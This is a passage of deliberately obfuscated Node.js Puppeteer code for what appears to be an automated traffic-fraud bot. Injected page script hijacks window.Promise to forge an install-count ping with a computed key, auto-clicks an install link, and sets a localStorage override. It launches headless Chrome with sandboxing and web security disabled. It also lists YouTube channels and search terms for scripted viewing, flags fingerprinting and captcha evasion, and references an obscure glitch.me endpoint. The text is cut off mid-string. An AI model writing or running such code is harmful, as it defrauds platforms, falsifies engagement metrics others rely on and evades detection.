                return this['bytes'] > 0x9a63 * 0x3914 + -0x13a06293f + 0x2179a0e82 && (this['hBytes'] += this['bytes'] / (0x45dca50 * 0x3c + -0x122ea30ec + 0x1 * 0x11ceec62c) << 0xca7 + -0x2641 + -0x199a * -0x1, this['bytes'] = this['bytes'] % (0x650fb670 + 0x1df13b10 + 0x7cff0e80)), this;
              }
            }
            ['finalize']() {
              const S = d;
              if (!this['finalized']) {
                this['finalized'] = 0x38 * 0x2c + 0x34b + -0xae * 0x13;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x109e * -0x2 + -0x1 * 0x81b + 0x2967] = this['block'], J[K >> -0x1 * 0x113b + -0x3a * -0x8 + 0xf6d] |= x[-0x221c + -0x1dbb * 0x1 + 0x3fda & K], this['block'] = J[0x1e07 + -0x1f3f + 0x148], K >= 0x2171 + 0x894 + -0x29cd && (this['hashed'] || this[S(0x8)](), J[-0x399 * -0x3 + 0x4 * 0x5db + -0x1cd * 0x13] = this['block'], J[0x1069 + 0xe * 0x2e + 0x12dd * -0x1] = J[-0x1549 + 0x8 * 0x1cf + 0x6d2] = J[-0x22f3 + -0x1 * -0xfdb + 0x2 * 0x98d] = J[0x19fa + 0x2 * 0xb42 + -0x307b] = J[-0x53 * 0x5 + -0x3fc + 0x59f] = J[-0x14f6 + 0x2225 + -0xd2a] = J[-0x1 * 0x952 + 0x1647 + -0xcef] = J[-0x14b5 + 0x6 * -0x556 + 0x34c0] = J[0x9ee * 0x3 + -0x1 * 0x1d39 + 0x1 * -0x89] = J[-0xb29 + 0x1ab6 + 0x3e1 * -0x4] = J[-0x1654 * 0x1 + 0x1b7 * 0x11 + -0x6c9] = J[-0xfd * -0x25 + 0x26ea + 0x96e * -0x8] = J[0x20f * -0x4 + -0x910 + -0xc * -0x172] = J[0x7 * 0x27a + -0x3 * -0xa13 + -0x2f82] = J[-0xf19 * 0x2 + -0x26c9 + 0x4509] = J[-0x17b5 + 0x25bc + -0xdf8] = -0x215e + -0xfc4 + 0x3122), J[-0x1f64 + -0x20ae * -0x1 + -0x13c] = this['hBytes'] << 0x3 * -0x457 + -0x3 * -0x326 + 0x396 | this['bytes'] >>> 0x11f4 * -0x1 + 0xb * -0x331 + 0x352c, J[0x1 * 0x8c5 + 0x3 * 0x7ba + -0x1fe4] = this['bytes'] << -0x1371 + -0x1 * -0x609 + 0xd6b, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xd92 * -0x2 + -0xb44 + 0x2 * 0x133c; J < -0x8f3 * 0x4 + 0x461 + 0x1fbb * 0x1; ++J)
                K = Q[J - (0x1 * -0x9c4 + -0x220 + 0xbe7 * 0x1)] ^ Q[J - (0x2ab * 0x7 + -0x9a2 + -0x903)] ^ Q[J - (-0x1a13 + -0xe5e * -0x2 + 0x29b * -0x1)] ^ Q[J - (0x1 * 0xa4 + 0x19 * -0x16f + 0x2343)], Q[J] = K << 0x50d * -0x5 + 0x24e4 + 0xba2 * -0x1 | K >>> 0x7 * 0x184 + -0x139c + 0x91f;
              for (J = 0x1123 + -0x5bf + -0xa2 * 0x12; J < -0x1e84 + -0x283 + 0x71 * 0x4b; J += 0x1ae4 + -0x10cd + -0x2 * 0x509)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x20d7 * 0x1 + 0x1c58 + -0x2 * 0x1e95 | L >>> 0xb20 + 0x110f + 0xe0a * -0x2) + (M & N | ~M & O) + P + (0x3b69a191 + -0x43746de0 + 0x628d45e8) + Q[J] << -0x87e + -0x1b6b + 0x1d * 0x13d) << 0x1b84 + 0x258a + -0x4109 | P >>> 0x2 * -0xd17 + 0x2054 * -0x1 + -0x3a9d * -0x1) + (L & (M = M << 0x2 * 0x9e6 + 0x2 * -0x107f + 0x10 * 0xd5 | M >>> -0xce8 + 0x1 * 0x1a3e + -0xd54) | ~L & N) + O + (0x2f4e65b + 0x1e0a75c * -0x35 + -0x9d86ece * -0x13) + Q[J + (0x1387 + -0xdea + -0x59c * 0x1)] << 0x210d + -0x1 * -0x1602 + -0x370f) << 0x266e + 0xeb7 * -0x1 + -0x17b2 | O >>> 0x277 * -0x7 + 0x993 + 0x7c9) + (P & (L = L << -0x1785 + 0x42 * -0x42 + -0xd8d * -0x3 | L >>> -0x25d9 + 0xdbd + 0x7 * 0x372) | ~P & M) + N + (0x4fc19c * -0xda + -0x12128d1 + 0x9f8e8142) + Q[J + (0x95d + -0x14b9 + -0xa * -0x123)] << -0x1a76 + -0x229b * 0x1 + 0x9 * 0x6c9) << -0x7a5 * 0x1 + 0x24 * -0x1a + -0xb52 * -0x1 | N >>> -0x5b + -0x1 * -0x1cc1 + -0x1 * 0x1c4b) + (O & (P = P << 0x244f + -0x2 * 0x129e + 0x10b | P >>> -0xd05 + 0x925 * 0x3 + 0x1 * -0xe68) | ~O & L) + M + (0xd24e0 * 0x7f0 + -0x2 * 0x21437d09 + 0x34b4c1ab) + Q[J + (-0x3 * -0xcaa + -0x194e + -0xcad)] << -0x3 * 0x9b1 + -0x16 * 0x149 + -0x3959 * -0x1) << -0xf58 + -0xe70 + 0x1dcd | M >>> -0x1a01 + 0x17f * 0x18 + -0x84 * 0x13) + (N & (O = O << 0x16ce + 0x5 * -0x5f2 + 0x11 * 0x6a | O >>> 0x1bb * 0x7 + 0x1d5c + -0x84b * 0x5) | ~N & P) + L + (-0x44decdb5 + -0x347a5ad5 + 0xd3dba223) + Q[J + (-0x2 * -0x888 + -0x3 * -0x764 + 0x1f6 * -0x14)] << 0x1983 + -0x4 * -0x4c1 + -0x2c87, N = N << -0x1 * -0x17c + -0xcf1 + 0xb93 * 0x1 | N >>> 0x1 * 0x171d + -0xba9 + -0xb72;
              for (; J < -0x22c8 + 0x1f33 + 0x3bd; J += 0x1a9 * -0x5 + -0xa3 * -0x22 + -0x1 * 0xd54)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4b3 + 0x1c5e + -0x210c | L >>> 0x2 * -0x8d1 + 0xb67 * -0x3 + -0x1 * -0x33f2) + (M ^ N ^ O) + P + (0x1d34da12 + 0x29308c4c + 0x1 * 0x28748543) + Q[J] << 0x9 * 0x14 + -0x1a55 + -0x2d9 * -0x9) << 0x2c * 0x8 + 0x13a + 0x295 * -0x1 | P >>> -0x11 * -0x3f + -0x164 * 0x7 + -0x8 * -0xb5) + (L ^ (M = M << -0x1cba + 0x5a * -0xd + 0x216a | M >>> 0x56b * -0x1 + -0x54c + 0xab9) ^ N) + O + (0xd4fbb678 + -0x27a2ac33 * 0x2 + 0x33d * -0x70f45) + Q[J + (0x1243 + -0x214e + 0x1ac * 0x9)] << -0x18d * -0xd + 0x4fe + -0x1927) << -0xc4e * 0x3 + 0x1a0e + -0x1 * -0xae1 | O >>> 0x62e + -0xce * 0x26 + 0x1881) + (P ^ (L = L << -0x194f + 0x1d * 0x25 + 0x153c | L >>> -0x60 * 0x43 + -0x2300 + 0x3c22) ^ M) + N + (0x30ec92f * 0x1 + 0xa1183231 + -0x354d0fbf) + Q[J + (-0xaef + 0x1d2d + -0x123c)] << -0x624 + -0xb * -0x1c1 + -0xd27) << -0x114 * 0x4 + 0x202a + -0x1bd5 | N >>> -0xa36 + -0xde + 0x199 * 0x7) + (O ^ (P = P << 0x22a * 0xd + 0x197e + 0x9 * -0x5f2 | P >>> 0x1a9 + 0x561 + -0x12 * 0x64) ^ L) + M + (0x37fe6752 + 0xcbb0cca8 + -0x94d54859) + Q[J + (-0x242f + 0x1b20 + -0x3 * -0x306)] << -0x10ae + -0x1ca8 + 0x2 * 0x16ab) << -0xbac + -0xbe9 * 0x1 + 0x179a | M >>> 0x38e + 0xc1 * -0x1 + -0x2b2) + (N ^ (O = O << 0x207f + 0x331 * -0x7 + 0x2 * -0x505 | O >>> -0x981 * 0x1 + -0x2b2 * 0x1 + 0xc35) ^ P) + L + (-0xbcd91a2f + -0xd1a95084 + -0x6b6916 * -0x4be) + Q[J + (-0x5b5 * 0x1 + 0x2f * 0xb5 + 0xdc1 * -0x2)] << 0x6cd + 0x898 + -0x233 * 0x7, N = N << -0x5e4 + 0x1 * -0xcc5 + 0x12c7 | N >>> 0x73b * 0x1 + 0x1ce7 + -0x2420;
              for (; J < 0x22a * 0x1 + -0x15f0 + 0x1402; J += 0x25eb + -0x184c + -0xd9a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x14a6 + -0x42 + 0x1e7 * 0xb | L >>> -0x1 * 0x1600 + 0x6 * -0x12e + 0x1d2f) + (M & N | M & O | N & O) + P - (-0xd3 * 0xf3420a + 0x171 * 0x789875 + 0x8b8ff0bd) + Q[J] << -0x133 * -0xe + -0x433 * -0x4 + 0x1 * -0x2196) << 0x3 * -0xa6a + 0x259b + -0xcb * 0x8 | P >>> -0x104d + 0x1c2b * -0x1 + 0x2c93) + (L & (M = M << -0x4cf * 0x2 + -0x3a7 * 0x3 + 0x14b1 | M >>> -0x1470 + 0x241b + -0xfa9) | L & N | M & N) + O - (0x8 * 0x7258ac2 + 0x12 * -0x2138795 + 0x5d17758e) + Q[J + (0x20b * 0x6 + -0x1b11 + -0x2 * -0x768)] << -0x147 + -0x1624 + 0x176b) << 0x90f * -0x2 + 0x863 + 0x9c0 | O >>> -0x249f + 0x635 + -0x1 * -0x1e85) + (P & (L = L << -0x6 * 0x459 + 0x5 * -0x665 + 0x1 * 0x3a2d | L >>> 0x3fe + -0x14db + 0x10df) | P & M | L & M) + N - (0x5b6d3efa + 0x2e9ee * -0x1819 + -0x16eb8b1a * -0x4) + Q[J + (0x1dd + 0xbf5 * 0x3 + -0x25ba * 0x1)] << -0x10b7 + -0xda8 + 0x613 * 0x5) << -0xb99 + 0xdac + 0x1 * -0x20e | N >>> -0x13d * -0xa + 0x2119 + -0x2d60) + (O & (P = P << 0x4c8 + 0x79 * -0x4a + 0x1e50 | P >>> -0x52 * 0xa + -0x253 * -0x1 + -0x1 * -0xe3) | O & L | P & L) + M - (-0x1d9ad4d * -0x23 + -0x41f3 * -0x3125 + 0x2378867e) + Q[J + (0x12d0 + 0x290 + -0x155d)] << -0x62 * 0x25 + 0xa6a + 0x3c0) << 0x132d + 0x96 * -0x27 + 0x3b2 | M >>> 0x156e + -0xdb4 + -0x79f) + (N & (O = O << 0x997 + -0x2 * -0xe17 + -0x25a7 | O >>> -0x3 * 0x313 + -0x8 * 0x282 + 0x1d4b) | N & P | O & P) + L - (-0xf75d48f + -0xc8629873 + 0x148bcb026) + Q[J + (-0x4b7 * -0x5 + 0x1 * 0x1622 + -0x2db1)] << 0x1a81 * -0x1 + -0x792 * -0x3 + 0x3cb * 0x1, N = N << -0x788 + 0x1 * -0x14b7 + 0x35 * 0x89 | N >>> -0xd0 * -0x22 + 0x2 * -0xd0 + 0x2 * -0xcff;
              for (; J < -0x1e9 + 0x9 * 0x383 + -0xeb1 * 0x2; J += 0x1ae1 * -0x1 + 0x1cf * -0x10 + 0x37d6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1bba + -0x15a1 + 0x5 * 0x9e0 | L >>> 0x28a * -0x2 + 0x1dbf + 0x20c * -0xc) + (M ^ N ^ O) + P - (-0x3d * 0x344dd1 + -0x2 * -0x355120d7 + -0x31ea6d3 * 0xd) + Q[J] << 0x10b8 + -0x4dd * -0x7 + 0x235 * -0x17) << -0xe2b + 0x2194 + -0x1364 | P >>> 0xd * 0x274 + -0x21 * -0x1e + 0x23a7 * -0x1) + (L ^ (M = M << -0x11f * -0x13 + 0x153 + -0x86 * 0x2b | M >>> 0xc06 + 0xcbe + 0xc61 * -0x2) ^ N) + O - (-0x23eb4235 + -0x1 * 0x1ab7d1df + -0x45dc23 * -0x1aa) + Q[J + (-0x1743 + 0x1e46 + 0x12b * -0x6)] << 0x33 * -0xa1 + 0x988 + 0x1 * 0x168b) << 0x1c7c * 0x1 + 0x7 * -0x394 + -0x36b | O >>> 0x1b24 + -0x704 + 0x1 * -0x1405) + (P ^ (L = L << 0x56e + -0x1 * 0x1bfd + 0x16ad | L >>> -0x17 * 0x31 + -0x2392 + 0x27fb) ^ M) + N - (-0xb * -0x851f49e + -0x1 * 0x364d965 + -0x22836b3b) + Q[J + (-0x544 + 0x1ddc + -0x1896)] << -0xe * -0x2c0 + 0x6a * -0x32 + -0x11cc) << -0xf * -0xb0 + -0x2582 + -0x1b37 * -0x1 | N >>> 0x212f + 0x1fe2 + -0x40f6) + (O ^ (P = P << 0x2599 + 0xa6e + -0x2fe9 | P >>> -0x1cf8 * 0x1 + 0x127b + -0x1 * -0xa7f) ^ L) + M - (0x2781a * -0x26a9 + -0x202f78f7 + 0xb541dc4b) + Q[J + (0x679 * -0x5 + 0x288 + -0x2fc * -0xa)] << 0xa04 + -0x4c6 + -0x53e) << 0xf3a + -0x2 * 0xf33 + 0xf31 | M >>> -0xf * 0x11b + 0x8d8 + 0x7d8) + (N ^ (O = O << -0x2 * 0x4cf + 0x13 * -0x17f + 0x2629 * 0x1 | O >>> 0x795 * -0x1 + -0x530 * -0x3 + -0x7f9) ^ P) + L - (-0xf577918 * 0x2 + 0x212fa9 * 0x16d + 0x24fb3c65) + Q[J + (0xbc9 + 0x2 * -0x5ed + 0x7 * 0x3)] << -0x6f7 + -0xd54 + 0x144b, N = N << -0x5b3 * -0x3 + 0x387 * -0x1 + -0x3 * 0x47c | N >>> -0x97 * -0x17 + 0xd * 0x2d3 + -0x3246;
              this['h0'] = this['h0'] + L << 0x3cb + 0x14 * 0xbc + 0xf9 * -0x13, this['h1'] = this['h1'] + M << -0x11b * 0x4 + 0x1 * 0x1ab3 + -0x1647, this['h2'] = this['h2'] + N << -0x9 * 0x3c3 + 0x1 * 0x199 + -0x2042 * -0x1, this['h3'] = this['h3'] + O << -0x1 * 0x23ae + 0x45 * -0x64 + 0x3ea2, this['h4'] = this['h4'] + P << -0x185 * 0x2 + -0x257e + 0x4 * 0xa22;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x5 * 0x1f5 + -0x35 * 0x16 + 0xe73 & 0xe41 + 0x14b8 + -0x22ea] + w[J >> -0x1d78 + -0x41 * 0x11 + -0x1 * -0x21e1 & -0x59 * 0x58 + -0x1 * -0x1f7d + -0xd6] + w[J >> 0x1178 + -0x2 * -0x2c3 + -0x16ea & -0x1146 + -0x1c65 + 0x2dba] + w[J >> 0x48 * 0x55 + 0x222e + -0x3a06 & -0x64 * 0x3 + -0x175a + 0x1d * 0xd9] + w[J >> 0x198a + -0xd6f * 0x2 + 0xb * 0x20 & 0x131a + -0xe1 * 0x13 + -0x258] + w[J >> 0xf7 * 0x5 + 0xced + -0x11b8 & 0x1c87 + -0x933 * -0x3 + -0x3811] + w[J >> 0x253 * 0xa + 0x235a + -0x3a94 & -0x1fb8 + -0x1 * -0x9e3 + 0x1 * 0x15e4] + w[0x12 * 0x52 + -0x415 + -0x1a0 & J] + w[K >> -0x111f + -0x3b * 0x45 + 0x1091 * 0x2 & 0x1db8 + 0x2b * -0x4 + 0x1cfd * -0x1] + w[K >> 0x4 * 0x427 + -0x1a14 + 0x990 & -0x6c3 + 0x1 * 0x23a5 + 0x1 * -0x1cd3] + w[K >> 0xc71 + -0x1c3c + -0xef * -0x11 & -0x5c9 + -0x1 * -0xb4c + -0x574] + w[K >> -0x1bb6 + -0x1cc7 * 0x1 + -0x1f * -0x1d3 & 0x1d85 + 0x14b1 * -0x1 + 0x1c1 * -0x5] + w[K >> -0x161 * -0x1a + -0x21d9 * 0x1 + -0x1f5 * 0x1 & 0x16d * 0x3 + 0x1676 + -0x1aae] + w[K >> -0x1ad4 + -0xb3 * 0xd + -0x23f3 * -0x1 & 0x39a * -0x6 + 0x22d0 + -0xd25] + w[K >> 0x16ad + 0x1ff9 + -0x36a2 & 0x2b * -0x9e + 0x449 * 0x9 + -0xbf8] + w[0xb9c + 0x1 * 0x544 + -0x35d * 0x5 & K] + w[L >> 0x19db + 0x1e6a + 0x1 * -0x3829 & 0x1 * 0x209b + 0x37 * -0x9 + -0x1e9d] + w[L >> -0xcd4 * -0x1 + 0x4 * -0x2ef + -0x100 & 0xd14 + -0x1200 + 0x4fb] + w[L >> -0x1e57 + 0x256e + -0x1 * 0x703 & -0x20b * 0xb + -0x403 + 0x1a8b] + w[L >> -0x53 * -0x3a + -0x36 + -0x1288 & 0x1d28 + 0x1d51 + -0x3a6a] + w[L >> 0xf08 + -0x2 * -0x1168 + -0x18e6 * 0x2 & -0x1efb + 0x33d + 0x1 * 0x1bcd] + w[L >> -0xce7 + 0xc01 + 0xee & 0x1ffa + 0x1 * 0x99b + 0x2 * -0x14c3] + w[L >> -0x2 * -0x1297 + -0x128b + -0x129f & -0x234 * -0x6 + 0x3 * 0x41c + -0x105 * 0x19] + w[-0x469 * 0x5 + -0x6 * 0x5c6 + 0x38c0 & L] + w[M >> -0x1 * 0x1d47 + 0x26ce + -0x96b & -0x141 * -0x7 + 0x1a4f + 0x93 * -0x3d] + w[M >> 0x1ba3 + -0x1d17 + 0x18c & 0xf59 + -0x8f0 + 0x3 * -0x21e] + w[M >> 0x3 * -0x112 + 0x1191 + -0xe47 & -0x10 * 0x1df + -0x1 * -0x461 + 0x445 * 0x6] + w[M >> -0x216 * -0x2 + 0xb * 0x234 + -0x716 * 0x4 & -0xae + 0x429 * 0x2 + 0x287 * -0x3] + w[M >> 0x19c * -0x4 + 0x1 * -0x5bf + 0x1 * 0xc3b & 0x4 * 0x45a + 0x250a + -0x3663] + w[M >> -0x686 + -0x3b * -0x83 + 0x17a3 * -0x1 & -0xd87 + -0x1 * -0x7bd + 0x5d9] + w[M >> 0x199 * -0x5 + -0x1285 * 0x1 + 0x5 * 0x54e & -0x6d * -0x47 + 0x1678 + 0x34a4 * -0x1] + w[-0x8b6 + 0x1111 + 0x76 * -0x12 & M] + w[N >> 0x561 * 0x1 + 0x23fd + -0x2942 & -0x11 * -0xa7 + -0x1a5a * 0x1 + 0xf52] + w[N >> -0x1bd7 * -0x1 + -0xf * -0x20e + -0x1d * 0x205 & 0x1a72 + 0xaf2 + -0x2555 * 0x1] + w[N >> 0x1 * 0x247d + 0x382 + -0x27eb & 0x1 * -0xa1f + -0x4c7 * 0x1 + -0x7 * -0x223] + w[N >> -0x19f3 * -0x1 + 0x19cf + 0x1 * -0x33b2 & -0x1 * 0x1db3 + -0xbff + -0x5f7 * -0x7] + w[N >> -0x929 * -0x1 + -0x1 * 0x1c96 + 0x1379 & 0x1b10 + -0x675 + -0x148c] + w[N >> 0x1b80 + 0x11 * 0x218 + 0x1 * -0x3f10 & -0xd83 * 0x1 + -0x18d * 0x9 + 0x1 * 0x1b87] + w[N >> 0x124e + 0x17ce + -0x2a18 * 0x1 & 0x43f * -0x7 + 0x1a97 + 0x13 * 0x2b] + w[-0x44 * -0x8 + 0x1058 + -0x1269 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x10ca + -0x260a + 0x1558 & 0x1 * -0x222b + -0x1d * 0xc7 + 0x39b5,
                J >> -0x2 * 0xe66 + -0x7b * -0x1e + 0xe72 & 0x17ff + 0x471 + -0x5 * 0x57d,
                J >> -0x61 * -0x8 + 0x2e1 * -0xd + 0x226d & 0x1 * 0x144d + -0x1a6d + -0x71f * -0x1,
                0xe77 * -0x1 + 0xe1 * -0x15 + 0x21eb & J,
                K >> -0xb * 0x18d + 0x21 * -0xf7 + 0x2 * 0x187f & 0x201b + -0x1 * -0x109 + -0x2025,
                K >> -0x1304 + -0x42 * -0xd + -0x21 * -0x7a & -0x55 * 0x1f + 0x1358 + 0x80e * -0x1,
                K >> 0x1b6e + 0x8 * -0x3ee + 0x40a & 0x173 * -0x16 + 0x1e2e + 0x2b3,
                -0xd4 * -0x8 + 0x1 * 0x7c7 + -0xd68 & K,
                L >> -0xaf6 + 0x3b9 * -0x8 + 0x28d6 & 0x1b0e + 0x1f72 + -0x15 * 0x2bd,
                L >> 0x2135 + -0x238 * 0x11 + -0x493 * -0x1 & -0x9a5 + -0x2696 + -0x1 * -0x313a,
                L >> -0x2 * -0x9a9 + 0xcef + -0x2039 & -0x1 * -0x236d + -0x119 * -0x13 + -0x3749 * 0x1,
                0x306 * 0xc + -0x1d65 + -0x5e4 & L,
                M >> -0x3d7 * 0x7 + -0x465 + 0x16 * 0x16d & 0xaab * 0x3 + 0x98f * 0x1 + -0x2891,
                M >> 0x23 * 0xb5 + -0x924 + 0x17 * -0xad & -0x3 * -0x161 + -0x1354 * 0x2 + 0x1 * 0x2384,
                M >> 0xece + 0x3 * -0x98d + 0xde1 * 0x1 & -0x2 * 0x8d2 + -0x25 * -0x25 + -0x12 * -0xbd,
                0x108c + 0x15e + 0x47 * -0x3d & M,
                N >> 0x4f8 + 0x1 * -0x21cb + 0x2a1 * 0xb & -0x14 * -0x1b1 + 0x3c3 * -0xa + 0x23 * 0x23,
                N >> 0x26 * 0x93 + 0x26b1 + -0xc17 * 0x5 & 0x2568 + -0x1004 + -0x1465,
                N >> 0x4e * 0x1 + 0x1623 + -0x1669 & 0x4 * 0x42d + -0x3e * -0x40 + -0x1f35,
                0x974 + -0x5 * 0xa5 + 0x1 * -0x53c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x53f * -0x5 + -0x914 + 0x2363), (K = new DataView(J))['setUint32'](0x2a * -0xb1 + -0x5 * -0x595 + 0x121, this['h0']), K['setUint32'](-0xc81 + 0x4 * 0x513 + -0x7c7, this['h1']), K['setUint32'](0x836 * 0x2 + 0x1da2 + -0x2e06, this['h2']), K['setUint32'](-0x21f4 + 0x2 * -0x1101 + 0xa * 0x6cd, this['h3']), K['setUint32'](0x1055 + 0x1117 + 0x6ac * -0x5, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x9 * 0x3c6 + 0x1 * -0x11b5 + -0x1041];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0xa * -0xa7 + -0x1 * 0x11a1 + -0x3 * -0x80d;
            J[-0x20a0 + -0x2493 * 0x1 + -0x49d * -0xf]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x6cf + 0x1a3 * -0x14 + 0x19ed] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1410 + 0x17a5 * -0x1 + -0x3 * -0x132), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x3a4 + -0x2466 + 0xc9 * 0x33;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x12 * -0x2 + -0x1 * -0x15bd + 0xed * -0x11), Promise['resolve'](0x61 * -0x3 + 0x136d * -0x2 + 0x27fe);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1ebf + 0x17 * -0x6d + 0x1 * 0x288a; j < -0x7 * 0x39b + 0x154e + -0x7 * -0x90; j++)
    i();
}
const NETWORK_PATIENCE = 0x24c3 + -0x1 * -0x359a + 0x199 * -0x25 + (-0x1 * -0x26d9 + 0x1 * -0x222d + -0x16 * -0x52) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * 0x1757 + -0x6b * 0xd + -0x11e5) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      T(0xc, 'vM4e') + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1247 + -0x586 * 0x6 + 0x336b; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const U = d;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this[U(0xe)])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + V(0x7) + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 